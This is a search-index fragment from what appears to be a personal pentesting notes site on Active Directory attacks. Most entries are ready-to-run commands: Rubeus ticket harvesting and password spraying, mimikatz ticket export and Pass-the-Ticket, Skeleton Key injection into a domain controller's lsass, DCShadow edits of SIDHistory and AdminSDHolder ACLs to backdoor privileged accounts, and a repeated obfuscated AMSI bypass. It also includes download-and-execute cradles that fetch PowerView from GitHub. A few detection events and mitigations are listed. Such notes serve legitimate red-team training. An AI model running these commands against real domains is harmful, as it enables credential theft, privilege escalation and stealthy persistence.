\u0026ldquo;reuse the end-user credentials to access resources hosted on a different server\u0026rdquo; E.g. user authenticates to webserver, then webserver impersonates user to authenticate to database server But: Service account for web server must be trusted for delegation to impersonate user  Authentication Process #  User provides credentials to DC DC returns TGT User requests TGS for web service on Web Server Web server service account uses the user\u0026rsquo;s TGT to request TGS for the database server from the DC Web server service account connects to the database server as the user  Types of Kerberos Delegation # Unconstrained #  General/basic delegation Allows service to access any server on any computer in the domain  Constrained #  Allows service to request access only to specified computers/resources If user is not using Kerberos authentication to authenticate to web server, Windows offers Protocol Transition to transition the request to Kerberos  "}).add({id:31,href:"/active_directory/lateral_movement/ticket_harvesting/",title:"Ticket Harvesting",description:"Ticket harvesting using Rubeus.",content:"Harvesting Tickets # # Harvest for TGTs every 30 seconds Rubeus.exe harvest /interval:30 Brute-forcing / Password-spraying # Rubeus.exe brute /password:Password1 /noticket "}).add({id:32,href:"/active_directory/domain_enumeration/domain_acl/",title:"Domain ACLs",description:"Enumerating domain ACLs.",content:"General #  Access Control Entries (ACE) correspond to individual permission or audits access Who has permission and what can be done on an object? Two types:  DACL -\u0026gt; Defines the permissions trustees (a user or group) have on an object SACL - Logs success and failure audit messages when an object is accessed    ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Enumerate ACLs without resolving GUIDs (Get-ACL \u0026#39;CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local\u0026#39;).Access PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Get the ACLs associated with the specified object Get-ObjectACL -SamAccountName \u0026#34;Users\u0026#34; -ResolveGUIDs # Get the ACLs associated with the specified prefix to be used for search Get-ObjectACL -ADSPrefix \u0026#39;CN=Administrator,CN=Users\u0026#39; -Verbose # Get the ACLs associated with the specified LDAP path to be used for search Get-ObjectACL -ADSPath \u0026#34;LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local\u0026#34; -ResolveGUIDs -Verbose # Search for interesting ACEs Invoke-ACLScanner -ResolveGUIDs # Get the ACLs associated with the specified path Get-PathACL -Path \u0026#34;\\\\dc01.lab.local\\sysvol\u0026#34; # Enumerate who has rights to the \u0026#39;matt\u0026#39; user in \u0026#39;testlab.local\u0026#39;, resolving rights GUIDs to names Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local # Grant user \u0026#39;will\u0026#39; the rights to change \u0026#39;matt\u0026#39;s password Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose # Audit the permissions of AdminSDHolder, resolving GUIDs Get-DomainObjectAcl -SearchBase \u0026#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local\u0026#39; -ResolveGUIDs # Backdoor the ACLs of all privileged accounts with the \u0026#39;matt\u0026#39; account through AdminSDHolder abuse Add-DomainObjectAcl -TargetIdentity \u0026#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local\u0026#39; -PrincipalIdentity matt -Rights All # Retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync) Get-DomainObjectAcl \u0026#34;dc=dev,dc=testlab,dc=local\u0026#34; -ResolveGUIDs | ? { ($_.ObjectType -match \u0026#39;replication-get\u0026#39;) -or ($_.ActiveDirectoryRights -match \u0026#39;GenericAll\u0026#39;) } # Enumerate permissions for GPOs where users with RIDs of \u0026gt; -1000 have some kind of modification/control rights Get-DomainObjectAcl -LDAPFilter \u0026#39;(objectCategory=groupPolicyContainer)\u0026#39; | ? { ($_.SecurityIdentifier -match \u0026#39;^S-1-5-.*-[1-9]\\d{3,}$\u0026#39;) -and ($_.ActiveDirectoryRights -match \u0026#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner\u0026#39;)} "}).add({id:33,href:"/active_directory/domain_persistence/dcshadow/",title:"DC Shadow",description:"Persistence using DC Shadow.",content:"General #  Temporarily register a new domain controller in the target domain Use it to \u0026ldquo;push\u0026rdquo; attributes like SIDHistory or SPN on the target object Does not leave any change logs for the modified object New DC is registered my modifying the Configuration container, SPNs of an existing computer object and some RPC services Since attributes are changed from a DC, there are no change logs on the actual DC for the target object Requires DA privileges by default Attacker machine must be part of root domain of the forest  Exploitation #  Requires two mimikatz sessions One with SYSTEM privileges to start RPC servers and specifiy attributes we want to modify  !+ !processtoken lsadump::dcshadow /object:root572user /attribute:Description /value=\u0026#34;Hello from DCShadow\u0026#34;  Another with enough privileges (DA or required permissions) to push the values  lsadump::dcshadow /push Minimal Permissions #  DCShadow can be used with minimal permissions by modifying the ACLs of the  domain object  DS-Install-Replica (Add/Remove Replica in Domain) DS-Replication-Manage-Topology (Manage Replication Topology) DS-Replication-Syncrhonize (Replication Synchronization)   sites object (and its children) in the Configuration container  CreateChild and DeleteChild   object of the computer which is registered as a temporary DC  WriteProperty (Not Write)   target object  WriteProperty (Not Write)     We can use Set-DCShadowPermissions from Nishang for setting the permissions Then, we don\u0026rsquo;t need the second mimikatz instance running as a DA to push the changes  # Use DCShadow as user student572 to modify root572user object from machine mcorp-student572 Set-DCShadowPermissions -FakeDC mcorp-student572 -SAMAccountName root572user -Username student572 -Verbose Interesting Attack Vectors # Set SIDHistory of a User Account to Enterprise Admins or Domain Admins Group #  User will not show up as EA/DA when running queries like net group \u0026quot;Enterprise Admins\u0026quot; /domain  lsadump::dcshadow /object:student572 /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519 Set primaryGroupID of a User Account to Enterprise Admins or Domain Admins #  Use will show up as a member of the target group when running queries like net group \u0026quot;Enterprise Admins\u0026quot; /domain  lsadump::dcshadow /object:student572 /attribute:primaryGroupID /value:519 Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a User # # Get the current ACL and copy it to clipboard (New-Object System.DirectoryServices.DirectoryEntry((\u0026#34;LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local\u0026#34;)).psbase.ObjectSecurity.sddl | Set-Clipboard # Append a FullControl ACE from above for SY/BA/DA # Replace SY/BA/DA with our user\u0026#39;s SID # Get current user SID with PowerView Get-DomainUser student572 | select objectsid # Mimikatz command lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString DCShadowception #  Run DCShadow from DCShadow Modifying permissions for objects so we dont need DA rights will also not leave any logs  # Elevate to SYSTEM in mimikatz session !+ !processtoken # Get ACL for domain object # ACEs to append: # (OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID) # (OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID) # (OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID) (New-Object System.DirectoryServices.DirectoryEntry((\u0026#34;LDAP://DC=moneycorp,DC=local\u0026#34;)).psbase.ObjectSecurity.sddl # Mimikatz command lsadump::dcshadow /stack /object:DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString # Get ACL for computer object (attacker machine) # ACE to append: (A;;WP;;;UserSID) (New-Object System.DirectoryServices.DirectoryEntry((\u0026#34;LDAP://CN=mcorp-student572,CN=Computers,DC=moneycorp,DC=local\u0026#34;)).psbase.ObjectSecurity.sddl # Mimikatz command lsadump::dcshadow /stack /object:mcorp-student572$ /attribute:ntSecurityDescriptor /value:$modifiedACEString # Get ACL for target user # ACE to append: (A;;WP;;;UserSID) (New-Object System.DirectoryServices.DirectoryEntry((\u0026#34;LDAP://CN=student572,CN=Users,DC=moneycorp,DC=local\u0026#34;)).psbase.ObjectSecurity.sddl # Mimikatz command lsadump::dcshadow /stack /object:student572 /attribute:ntSecurityDescriptor /value:$modifiedACEString # Get ACL for Sites object in Configuration container # ACE to append: (A;CI;CCDC;;;UserSID) (New-Object System.DirectoryServices.DirectoryEntry((\u0026#34;LDAP://CN=Sites,CN=Configuration,DC=moneycorp,DC=local\u0026#34;)).psbase.ObjectSecurity.sddl # Mimikatz command lsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString # Start RPC server lsadump::dcshadow # Push changes from other session lsadump::dcshadow /push "}).add({id:34,href:"/active_directory/lateral_movement/pass_the_ticket/",title:"Pass-the-Ticket",description:"Pass-the-Ticket attack.",content:"Overview #  Use mimikatz to dump TGT from LSASS memory Will give us .kirbi ticket which can be used to gain domain admin if ticket is from domain admin Reuse old ticket to impersonate that ticket Can also use base64-encoded tickets gathered with Rubeus Look for Administrator tickets  Exploitation # # Start mimikatz and get SYSTEM mimikatz.exe privilege::debug token::elevate # Export all .kirbi tickets to current directory sekurlsa::tickets /export # PTT with mimikatz kerberos::ptt \u0026lt;ticket\u0026gt; # List cached tickets klist Mitigation: #  Don\u0026rsquo;t let domain admins log onto anything except the domain controller  "}).add({id:35,href:"/active_directory/domain_enumeration/domain_trusts/",title:"Domain Trusts",description:"Enumerating domain trusts.",content:"General #  Relationship between two domains or forest Trusted Domain Objects (TDOs) represent trust relationship in a domain Types of trusts  One-way: users in trusted domain can access resources in the trusting domain Two-way trust: users of both domains can access resources in the other domain Transitive: If A and B trust each other and B and C trust each other, A and C also trust each other (default between domains in same forest) Non-transitive: cannot be extended to other domains in the forest (default between two domains in different forests) Automatic trust: created automatically when creating new subdomain (parent-child, tree-root) Shortcut trusts: used to reduce access time in complex trust scenarios External trusts: between two domains in different forests when forests do not have a turst relationships Forest trusts: between forest root domains    ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get a list of all domain trusts for the current domain Get-ADTrust Get-ADTrust -Filter * | Select Source,Target,Direction Get-ADTrust -Identity test.lab.local PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Get a list of all domain trusts for the current domain Get-NetDomainTrust Get-NetDomainTrust -Domain test.lab.local "}).add({id:36,href:"/active_directory/domain_persistence/skeleton_key/",title:"Skeleton Key",description:"Persistence using Skeleton Key.",content:"General #  Patch a Domain Controller (lsass process) so that it allows access as any user with a single password Discovered in malware named Skeleton Key malware All publicly known methods are NOT persistent accross reboots Mimikatz to the rescue  Exploitation # # Inject skeleton key on DC of choice with default password of \u0026#39;mimikatz\u0026#39;. DA privs required Invoke-Mimikatz -Command \u0026#39;\u0026#34;privilege::debug\u0026#34; \u0026#34;misc::skeleton\u0026#34;\u0026#39; -ComputerName dcorp-dc.dollarcorp.moneycorp.local # If lsass is running as procted process we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of target DC. Very noisy! mimikatz # privilege::debug mimikatz # !+ mimikatz # !processprotect /process:lsass.exe /remove mimikatz # misc::skeleton mimikatz # !- # Access machine with valid username Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\\administrator Detection #  Events:  7045: A service was installed in the system (Type: Kernel Mode Driver) 4624: Account Logon 4634: Account Logoff 4672: Admin Logon   Events(\u0026ldquo;Audit Privilege Use\u0026rdquo; must be enabled)  4673: Sensitive Privilege Use 4611: A trusted logon process has been registered with the Local Security Authority    Get-WinEvent -FilterHashtable @{Logname=\u0026#39;Security\u0026#39;;ID=7045} | ?{$_.message -like \u0026#34;*Kernel Mode Driver*\u0026#34;} # Not recommended (detects only stock mimidriv) Get-WinEvent -FilterHashtable @{Logname=\u0026#39;Security\u0026#39;;ID=7045} | ?{$_.message -like \u0026#34;*Kernel Mode Driver*\u0026#34; -and $_.message -like \u0026#34;*mimidrv*\u0026#34;} Mitigation #  Run lsass.exe as a protected process, as it forces an attacker to load a kernel mode driver -\u0026gt; log detection Test before implementing, as many drivers and plguins may not load with the protection  New-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name RunAsPPL -Value 1 -Verbose # Verify after reboot Get-WinEvent -FilterHashtable @{Logname=\u0026#39;Security\u0026#39;;ID=12} | ?{$_.message -like \u0026#34;*protected process*\u0026#34;} "}).add({id:37,href:"/active_directory/domain_enumeration/domain_forest_mappings/",title:"Domain Forest Mappings",description:"Enumerating domain forest mappings.",content:"ActiveDirectory Module # Setup # # If computer has internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1\u0026#39;);Import-ActiveDirectory # If computer has no internet access, download repository Import-Module .\\ADModule\\Microsoft.ActiveDirectory.Management.dll -Verbose Import-Module .\\ADModule\\ActiveDirectory\\ActiveDirectory.psd1 # Check if module has been imported correctly Get-Command -Module ActiveDirectory Commands # # Get details about the current forest Get-ADForest Get-ADForest -Identity lab.local # Get all domains in the current forest (Get-ADForest).Domains # Get all global catalogs for the current forest Get-ADForest | Select -ExpandProperty GlobalCatalogs # Map trusts of a forest Get-ADTrust -Filter \u0026#39;msDS-TrustForestTrustInfo -ne \u0026#34;$null\u0026#34;\u0026#39; PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Get details about the current forest Get-NetForest Get-NetForest -Forest lab.local # Get all domains in the current forest Get-NetForestDomain Get-NetForestDomain -Forest lab.local # Get all global catalogs for the current forest Get-NetForestCatalog Get-NetForestCatalog -Forest lab.local # Map trusts of a forest Get-NetForestTrust Get-NetForestTrust -Forest lab.local # Map all trusts in current forest Get-NetForestDomain | Get-NetDomainTrust "}).add({id:38,href:"/active_directory/domain_enumeration/files_and_shares/",title:"Files and Shares",description:"Enumerating files \u0026 shares.",content:"PowerView # Setup # # If it gets blocked by AMSI we can bypass it with S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) # Then load the module Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 # With internet access iex (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1\u0026#39;) Commands # # Find shares on hosts in current domain Invoke-ShareFinder -Verbose # Find shares from other domain Invoke-ShareFinder -Domain lab.local # Exclude default shares Invoke-ShareFinder -ExcludeStandard # Show only shares the current user has access to Invoke-ShareFinder -CheckShareAccess # Find sensitive files on computers in the domain Invoke-FileFinder -Verbose # Get all fileservers of the domain Get-NetFileServer # use alternate credentials for searching for files on the domain # Find-InterestingDomainShareFile == old Invoke-FileFinder $Password = \u0026#34;PASSWORD\u0026#34; | ConvertTo-SecureString -AsPlainText -Force $Credential = New-Object System.Management.Automation.PSCredential(\u0026#34;DOMAIN\\user\u0026#34;,$Password) Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential "}).add({id:39,href:"/active_directory/domain_enumeration/bloodhound/",title:"BloodHound",description:"Enumeration methods using Bloodhound.",content:"Setup # # Install bloodhound apt install bloodhound # Start console neo4j console # Open web console and login with default credentials: neo4j:neo4j firefox http://localhost:7474/browser/ # Start bloodhound and login with credentials bloodhound Get Loot with SharpHound.ps1 # # Default Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip # Try to avoid detection Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip -ExcludeDC "}).add({id:40,href:"/active_directory/domain_enumeration/kerbrute/",title:"Kerbrute",description:"Enumeration methods using Kerbrute.",content:"Overview #  Get precompiled binary for OS from https://github.com/ropnop/kerbrute/releases Does not trigger failed log on event Brute-force by sending only a single UDP frame to the KDC Enumerate users on the domain from a wordlist  Exploitation # # Username enumeration kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt "}).add({id:41,href:"/active_directory/domain_enumeration/powershell/",title:"PowerShell",description:"Enumeration methods using only PowerShell.",content:"Users # # Show local users Get-LocalUser # Show number of local users Get-LocalUser | Measure-Object -line # Get user by providing SID Get-LocalUser -SID \u0026#34;S-1-5-21-1394777289-3961777894-1791813945-501\u0026#34; # Show usernames and SIDs Get-LocalUser | Select-Object -Property Name,SID,Enabled # Show users that do not require a password Get-LocalUser | Where-Object -Property PasswordRequired -Eq $False Groups # # Show local groups Get-LocalGroup # Show number of local groups Get-LocalGroup | Measure-Object -line Networks # # Get network adapter and IP address information Get-NetIPAddress # Show only IPv4 addresses and show output in table format Get-NetIPAddress -AddressFamily IPv4 | Format-Table Get-NetIPAddress -AddressFamily IPv4 | ft  # Show listening ports Get-NetTCPConnection -State Listen Computers \u0026amp; Files # # Show installed patches Get-HotFix # Show informatio about specific patch Get-HotFix -ID KB4023834 # Search for backup files Get-ChildItem -Path C:\\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force gci -Path C:\\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force ls -Path C:\\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue -Force # Search files containing specific string Get-ChildItem C:\\* -Recurse | Select-String -pattern API_KEY # Get running processes Get-Process # Get all scheduled tasks Get-ScheduledTask # Get information about specific scheduled task Get-ScheduledTask -TaskName \u0026#34;new-sched-task\u0026#34; # Show owner of file/folder Get-ACL C:\\ # Language mode $ExecutionContext.SessionState.LanguageMode # AppLocker policy Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections # AMSI bypass S`eT-It`em ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + (\u0026#39;blE:1\u0026#39;+\u0026#39;q2\u0026#39;) + (\u0026#39;uZ\u0026#39;+\u0026#39;x\u0026#39;) ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( Get-varI`A`BLE ( (\u0026#39;1Q\u0026#39;+\u0026#39;2U\u0026#39;) +\u0026#39;zX\u0026#39; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f(\u0026#39;Uti\u0026#39;+\u0026#39;l\u0026#39;),\u0026#39;A\u0026#39;,(\u0026#39;Am\u0026#39;+\u0026#39;si\u0026#39;),(\u0026#39;.Man\u0026#39;+\u0026#39;age\u0026#39;+\u0026#39;men\u0026#39;+\u0026#39;t.\u0026#39;),(\u0026#39;u\u0026#39;+\u0026#39;to\u0026#39;+\u0026#39;mation.\u0026#39;),\u0026#39;s\u0026#39;,(\u0026#39;Syst\u0026#39;+\u0026#39;em\u0026#39;) ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f(\u0026#39;a\u0026#39;+\u0026#39;msi\u0026#39;),\u0026#39;d\u0026#39;,(\u0026#39;I\u0026#39;+\u0026#39;nitF\u0026#39;+\u0026#39;aile\u0026#39;) ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f (\u0026#39;S\u0026#39;+\u0026#39;tat\u0026#39;),\u0026#39;i\u0026#39;,(\u0026#39;Non\u0026#39;+\u0026#39;Publ\u0026#39;+\u0026#39;i\u0026#39;),\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) sET-ItEM ( \u0026#39;V\u0026#39;+\u0026#39;aR\u0026#39; + \u0026#39;IA\u0026#39; + \u0026#39;blE:1q2\u0026#39; + \u0026#39;uZx\u0026#39; ) ( [TYpE]( \u0026#34;{1}{0}\u0026#34;-F\u0026#39;F\u0026#39;,\u0026#39;rE\u0026#39; ) ) ; ( GeT-VariaBle ( \u0026#34;1Q2U\u0026#34; +\u0026#34;zX\u0026#34; ) -VaL ).\u0026#34;A`ss`Embly\u0026#34;.\u0026#34;GET`TY`Pe\u0026#34;(( \u0026#34;{6}{3}{1}{4}{2}{0}{5}\u0026#34; -f\u0026#39;Util\u0026#39;,\u0026#39;A\u0026#39;,\u0026#39;Amsi\u0026#39;,\u0026#39;.Management.\u0026#39;,\u0026#39;utomation.\u0026#39;,\u0026#39;s\u0026#39;,\u0026#39;System\u0026#39; ) ).\u0026#34;g`etf`iElD\u0026#34;( ( \u0026#34;{0}{2}{1}\u0026#34; -f\u0026#39;amsi\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;InitFaile\u0026#39; ),( \u0026#34;{2}{4}{0}{1}{3}\u0026#34; -f \u0026#39;Stat\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;NonPubli\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;c,\u0026#39; )).\u0026#34;sE`T`VaLUE\u0026#34;( ${n`ULl},${t`RuE} ) "}).add({id:42,href:"/docs/prologue/introduction/",title:"Introduction",description:"Doks is a Hugo theme for building secure, fast, and SEO-ready documentation websites, which you can easily update and customize.",content:"Get started # There are two main ways to get started with 